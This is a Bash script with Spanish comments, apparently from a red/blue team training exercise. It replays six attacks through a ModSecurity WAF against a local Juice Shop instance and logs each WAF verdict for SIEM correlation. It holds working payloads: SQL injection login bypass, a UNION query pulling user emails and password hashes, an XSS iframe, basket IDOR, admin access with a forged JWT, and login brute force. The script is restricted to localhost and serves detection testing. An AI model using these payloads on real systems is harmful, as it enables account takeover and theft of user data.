#!/usr/bin/env bash
# =============================================================================
# H3 · Red Team — repetición de las 6 PoC a través del WAF (ModSecurity + CRS)
# =============================================================================
# Objetivo H3: demostrar, para cada PoC, el veredicto del WAF (bloqueo vs paso)
# y dejar un evento con hora y marcador para que el Blue Team lo correlacione en
# el SIEM (Kibana / filebeat-*).
#
# A diferencia de H2 (que ataca la app directa en :3000), H3 ataca SIEMPRE por el
# WAF en localhost:8080 — el único punto de entrada perimetral (data flow F1->F3,
# límite de confianza TB1 del modelado de amenazas).
#
# Regla de enfrentamiento: SOLO se ataca la instancia local del grupo. El script
# aborta si BASE_URL no apunta a localhost / 127.0.0.1.
#
# NO inventa nada: la evidencia solo existe si el script se ejecuta de verdad
# contra un entorno levantado.
#
# Uso:
#   # 1) entorno en DetectionOnly (por defecto) -> levantar y correr:
#   bash red-team/poc/h3-waf/run-h3.sh
#   # 2) cambiar el WAF a On en entorno-blue-team/.env (MODSEC_RULE_ENGINE=On),
#   #    recrear el WAF y volver a correr:
#   bash red-team/poc/h3-waf/run-h3.sh
#
# Variables: BASE_URL (def http://localhost:8080), N (intentos de fuerza bruta,
# def 30), TARGET_BASKET (carrito ajeno a leer, def 1).
# =============================================================================
set -uo pipefail

BASE_URL="${BASE_URL:-http://localhost:8080}"
N="${N:-30}"
TARGET_BASKET="${TARGET_BASKET:-1}"
HERE="$(cd "$(dirname "$0")" && pwd)"
FORGE="$HERE/../V-05-jwt-forgery/forge.js"

# --- Regla de enfrentamiento: el objetivo debe ser loopback -----------------
host="$(printf '%s' "$BASE_URL" | sed -E 's#^[a-zA-Z]+://([^:/]+).*#\1#')"
case "$host" in
  localhost|127.0.0.1|::1|[::1]) : ;;
  *)
    echo "ABORTADO: BASE_URL='$BASE_URL' no es loopback. H3 solo ataca la instancia local (localhost / 127.0.0.1)." >&2
    exit 2 ;;
esac

RUN="redteam-h3-$(TZ=America/Guatemala date '+%Y%m%dT%H%M%S')"
TS_HUMAN="$(TZ=America/Guatemala date '+%Y-%m-%d %H:%M:%S %Z')"

# --- Detectar el modo del WAF por sondeo (fuente de verdad) ------------------
# Si una SQLi canónica en la búsqueda devuelve 403, el WAF está bloqueando (On).
PROBE_CODE=$(curl -s -o /dev/null -w '%{http_code}' -A "$RUN-probe" \
  -G "$BASE_URL/rest/products/search" --data-urlencode "q=' OR 1=1--" 2>/dev/null || echo 000)
if [ "$PROBE_CODE" = "000" ]; then
  echo "ABORTADO: el WAF en $BASE_URL no responde. ¿Está levantado el entorno (docker compose up -d en entorno-blue-team/)?" >&2
  exit 1
fi
if [ "$PROBE_CODE" = "403" ]; then BLOCKING=1; MODE="on"; else BLOCKING=0; MODE="detectiononly"; fi

# Modo declarado en .env (solo informativo)
ENV_MODE="$(sed -n 's/^MODSEC_RULE_ENGINE=//p' "$HERE/../../../entorno-blue-team/.env" 2>/dev/null | head -1)"
ENV_MODE="${ENV_MODE:-desconocido}"

EVID="${EVID:-$HERE/../../evidencias/h3-$MODE-$RUN}"
mkdir -p "$EVID"

echo "=============================================================="
echo " H3 Red Team · PoC a través del WAF"
echo " Fecha:        $TS_HUMAN"
echo " Objetivo:     $BASE_URL   (WAF ModSecurity + CRS)"
echo " Modo WAF:     observado=$MODE (sondeo HTTP $PROBE_CODE) | .env=$ENV_MODE"
echo " Marcador:     $RUN   (filtrar en Kibana: user_agent.original: $RUN*)"
echo " Evidencia:    $EVID"
echo "=============================================================="

# Acumuladores para la tabla final
IDS=(); VECT=(); SEES=(); OBS=(); EXP=(); VERD=()

# Clasifica el veredicto de una PoC que el WAF SÍ puede ver (inyección/XSS)
verdict_sees() { # $1=code
  local code="$1"
  if [ "$BLOCKING" = "1" ]; then
    EXP+=("403 bloqueado"); if [ "$code" = "403" ]; then VERD+=("OK · bloqueado"); else VERD+=("⚠ NO bloqueado (evasión / revisar CRS)"); fi
  else
    EXP+=("pasa + queda en audit.log"); if [ "$code" = "403" ]; then VERD+=("⚠ 403 en DetectionOnly (revisar modo)"); else VERD+=("OK · pasa; Blue debe verla en Kibana"); fi
  fi
}
# Clasifica el veredicto de una PoC que el WAF NO puede ver (lógica/firma/ráfaga)
verdict_blind() { # $1=code
  local code="$1"
  EXP+=("pasa (el WAF no la ve)")
  if [ "$code" = "403" ]; then VERD+=("⚠ bloqueada inesperadamente"); else VERD+=("OK · no bloqueada (solo SIEM la detecta)"); fi
}

# ----------------------------------------------------------------------------
# V-01 · SQLi en login  (BO-2/SO-5 · F1->F3 cuerpo JSON · WAF SÍ lo ve, CRS 942xxx)
# ----------------------------------------------------------------------------
echo; echo "[V-01] SQLi login  POST /rest/user/login  {\"email\":\"' OR 1=1--\"}"
d="$EVID/V-01-sqli-login"; mkdir -p "$d"
printf '{"email":"%s","password":"x"}' "' OR 1=1--" > "$d/request.json"
code=$(curl -s -A "$RUN-V01" -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' \
  --data @"$d/request.json" -o "$d/response.json" -w '%{http_code}')
echo "  -> HTTP $code"; echo "$code" > "$d/http_code.txt"
if [ "$code" != "403" ]; then
  role=$(python3 -c "import json,sys;t=json.load(open('$d/response.json')).get('authentication',{}).get('token','');p=t.split('.')[1] if t else '';import base64;p+='='*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p))['data']['role']) if p else print('')" 2>/dev/null || true)
  [ -n "${role:-}" ] && echo "  impacto: JWT obtenido, role=$role"
fi
IDS+=("V-01"); VECT+=("SQLi login"); SEES+=("Sí (942xxx)"); OBS+=("$code"); verdict_sees "$code"

# ----------------------------------------------------------------------------
# V-02 · SQLi UNION en búsqueda  (BO-2/SO-5 · F1->F3 query string · WAF SÍ lo ve)
# ----------------------------------------------------------------------------
echo; echo "[V-02] SQLi UNION  GET /rest/products/search?q=...UNION SELECT...FROM Users--"
d="$EVID/V-02-sqli-union-search"; mkdir -p "$d"
Q="qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9','10' FROM Users--"
echo "$Q" > "$d/payload.txt"
code=$(curl -s -A "$RUN-V02" -G "$BASE_URL/rest/products/search" --data-urlencode "q=$Q" \
  -o "$d/response.json" -w '%{http_code}')
echo "  -> HTTP $code"; echo "$code" > "$d/http_code.txt"
if [ "$code" != "403" ]; then
  n=$(python3 -c "import json;print(len(json.load(open('$d/response.json')).get('data',[])))" 2>/dev/null || echo "?")
  echo "  impacto: $n filas (email + hash) exfiltradas"
fi
IDS+=("V-02"); VECT+=("SQLi UNION exfiltración"); SEES+=("Sí (942xxx)"); OBS+=("$code"); verdict_sees "$code"

# ----------------------------------------------------------------------------
# V-03 · DOM XSS en búsqueda  (BO-5/SO-5 · el '#' NO llega al WAF; sí la API)
#   El WAF solo puede ver la llamada API /rest/products/search?q=<payload> (941xxx).
#   La ejecución real en navegador se demuestra con la PoC H2 (xss-check.js).
# ----------------------------------------------------------------------------
echo; echo "[V-03] DOM XSS  GET /rest/products/search?q=<iframe src=javascript:alert(\`xss\`)>"
d="$EVID/V-03-xss-dom-search"; mkdir -p "$d"
XSS='<iframe src="javascript:alert(`xss`)">'
echo "$XSS" > "$d/payload.txt"
code=$(curl -s -A "$RUN-V03" -G "$BASE_URL/rest/products/search" --data-urlencode "q=$XSS" \
  -o "$d/response.json" -w '%{http_code}')
echo "  -> HTTP $code (veredicto del WAF sobre la llamada API; el DOM XSS en sí se ejecuta en el cliente)"
echo "$code" > "$d/http_code.txt"
echo "nota: el fragmento #/search?q=... no viaja al WAF; la ejecución del alert se prueba con red-team/poc/V-03-xss-dom-search (PLAYWRIGHT_DIR)." > "$d/nota.txt"
IDS+=("V-03"); VECT+=("DOM XSS (vía API)"); SEES+=("Sí en la API (941xxx)"); OBS+=("$code"); verdict_sees "$code"

# ----------------------------------------------------------------------------
# V-04 · IDOR de carrito  (BO-3/SO-1 · F3 petición legítima, SIN payload · WAF NO lo ve)
# ----------------------------------------------------------------------------
echo; echo "[V-04] IDOR  registrar customer -> GET /rest/basket/$TARGET_BASKET con su token"
d="$EVID/V-04-idor-basket"; mkdir -p "$d"
em="idor.$(date +%s)@example.com"
printf '{"email":"%s","password":"Passw0rd!","passwordRepeat":"Passw0rd!","securityQuestion":{"id":1},"securityAnswer":"x"}' "$em" > "$d/registro.json"
curl -s -A "$RUN-V04" -X POST "$BASE_URL/api/Users/" -H 'Content-Type: application/json' --data @"$d/registro.json" -o "$d/registro-resp.json" >/dev/null
printf '{"email":"%s","password":"Passw0rd!"}' "$em" > "$d/login.json"
curl -s -A "$RUN-V04" -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data @"$d/login.json" -o "$d/login-resp.json" >/dev/null
ctok=$(python3 -c "import json;print(json.load(open('$d/login-resp.json')).get('authentication',{}).get('token',''))" 2>/dev/null || true)
mybid=$(python3 -c "import json;print(json.load(open('$d/login-resp.json')).get('authentication',{}).get('bid',''))" 2>/dev/null || true)
if [ -n "${ctok:-}" ]; then
  code=$(curl -s -A "$RUN-V04" "$BASE_URL/rest/basket/$TARGET_BASKET" -H "Authorization: Bearer $ctok" -o "$d/basket-ajeno.json" -w '%{http_code}')
  owner=$(python3 -c "import json;print(json.load(open('$d/basket-ajeno.json')).get('data',{}).get('UserId',''))" 2>/dev/null || true)
  echo "  -> HTTP $code  (mi carrito bid=$mybid; carrito $TARGET_BASKET dueño UserId=$owner)"
else
  code="n/d"; echo "  -> no se pudo obtener token de customer (code registro/login); revisar $d"
fi
echo "$code" > "$d/http_code.txt"
IDS+=("V-04"); VECT+=("IDOR carrito"); SEES+=("No (petición legítima)"); OBS+=("$code"); verdict_blind "$code"

# ----------------------------------------------------------------------------
# V-05 · JWT forjado con clave filtrada  (BO-2/SO-3 · F3 firma VÁLIDA · WAF NO lo ve)
# ----------------------------------------------------------------------------
echo; echo "[V-05] JWT forjado  GET /api/Users/ con token admin firmado con la clave del repo"
d="$EVID/V-05-jwt-forgery"; mkdir -p "$d"
if command -v node >/dev/null 2>&1 && [ -f "$FORGE" ]; then
  ftok=$(node "$FORGE"); echo "$ftok" > "$d/token-forjado.txt"
  c0=$(curl -s -A "$RUN-V05" -o /dev/null -w '%{http_code}' "$BASE_URL/api/Users/?size=2")
  code=$(curl -s -A "$RUN-V05" -H "Authorization: Bearer $ftok" "$BASE_URL/api/Users/?size=3" -o "$d/api-users-con-token-forjado.json" -w '%{http_code}')
  echo "  -> sin token: HTTP $c0   con token FORJADO: HTTP $code"
  echo "sin_token=$c0 con_token_forjado=$code" > "$d/http_code.txt"
else
  code="n/d"; echo "  -> node o forge.js no disponible; omitido. (forge.js: $FORGE)"; echo "n/d" > "$d/http_code.txt"
fi
IDS+=("V-05"); VECT+=("JWT forjado -> admin"); SEES+=("No (firma válida)"); OBS+=("$code"); verdict_blind "$code"

# ----------------------------------------------------------------------------
# V-06 · Fuerza bruta  (BO-2/SO-6 · F3 N× 401 sin payload · WAF NO limita; SIEM por ráfaga)
# ----------------------------------------------------------------------------
echo; echo "[V-06] Fuerza bruta  $N× POST /rest/user/login (contraseñas erróneas) desde la misma IP"
d="$EVID/V-06-brute-force-login"; mkdir -p "$d"
: > "$d/codigos.txt"
for i in $(seq 1 "$N"); do
  c=$(curl -s -A "$RUN-V06" -o /dev/null -w '%{http_code}' -X POST "$BASE_URL/rest/user/login" \
      -H 'Content-Type: application/json' --data "{\"email\":\"admin@juice-sh.op\",\"password\":\"wrong$i\"}")
  echo "$i $c" >> "$d/codigos.txt"
done
r401=$(awk '$2==401' "$d/codigos.txt" | wc -l | tr -d ' ')
r403=$(awk '$2==403' "$d/codigos.txt" | wc -l | tr -d ' ')
r429=$(awk '$2==429' "$d/codigos.txt" | wc -l | tr -d ' ')
echo "  -> de $N: 401=$r401  403=$r403  429=$r429"
echo "N=$N 401=$r401 403=$r403 429=$r429" > "$d/resumen.txt"
code="401=$r401/403=$r403/429=$r429"
IDS+=("V-06"); VECT+=("Fuerza bruta login"); SEES+=("No por firma (sí por ráfaga en SIEM)"); OBS+=("$code")
EXP+=("pasa; 0× 429 (CRS no limita ráfaga)")
if [ "$r429" = "0" ]; then VERD+=("OK · sin rate-limit; regla de ráfaga del SIEM debe alertar"); else VERD+=("⚠ hubo 429 (¿rate-limit activo?)"); fi

# ----------------------------------------------------------------------------
# Tabla final + resumen de evidencia
# ----------------------------------------------------------------------------
SUM="$EVID/resumen.md"
{
  echo "# H3 · PoC a través del WAF — $TS_HUMAN"
  echo
  echo "- Objetivo: \`$BASE_URL\` (WAF ModSecurity + CRS)"
  echo "- Modo WAF observado: **$MODE** (sondeo HTTP $PROBE_CODE) · .env declara: \`$ENV_MODE\`"
  echo "- Marcador para el SIEM: \`$RUN\` → en Kibana filtrar \`user_agent.original: $RUN*\`"
  echo
  echo "| ID | Vector | ¿WAF lo ve? | Observado | Esperado ($MODE) | Veredicto |"
  echo "|---|---|---|---|---|---|"
  for i in "${!IDS[@]}"; do
    echo "| ${IDS[$i]} | ${VECT[$i]} | ${SEES[$i]} | ${OBS[$i]} | ${EXP[$i]} | ${VERD[$i]} |"
  done
} > "$SUM"

echo
echo "=============================================================="
echo " RESULTADO ($MODE)"
echo "=============================================================="
printf '%-6s %-28s %-26s %-16s %s\n' "ID" "Vector" "WAF ve?" "Observado" "Veredicto"
for i in "${!IDS[@]}"; do
  printf '%-6s %-28s %-26s %-16s %s\n' "${IDS[$i]}" "${VECT[$i]}" "${SEES[$i]}" "${OBS[$i]}" "${VERD[$i]}"
done
echo
echo "Resumen escrito en: $SUM"
echo "Pasar al Blue Team: marcador '$RUN' y la hora '$TS_HUMAN' para correlacionar en Kibana."
